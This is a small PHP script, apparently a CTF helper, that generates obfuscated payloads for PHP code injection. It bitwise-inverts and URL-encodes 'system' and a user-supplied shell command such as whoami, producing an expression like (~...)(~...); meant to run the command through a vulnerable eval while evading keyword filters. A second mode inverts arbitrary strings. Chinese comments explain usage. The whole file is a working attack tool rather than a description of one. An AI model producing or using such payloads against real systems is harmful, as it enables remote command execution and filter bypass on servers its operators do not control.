<?php
if(isset($_GET['code']) && !empty($_GET['code'])){
    $code = $_GET['code'];
    # echo $rcetext;
    echo "("."~".urlencode(~"system").")"."("."~".urlencode(~$code).")".";";
} else if (isset($_GET['code1']) && !empty($_GET['code1'])){
	$code1 = $_GET['code1'];
    # echo $rcetext;
	echo "~".urlencode(~$code1);
} else {
    echo "get传入code参数，并输入要取反的命令，如whoami";
	echo "<br/>";
	echo "如果要纯粹的取反，请传入code1";
}
?>
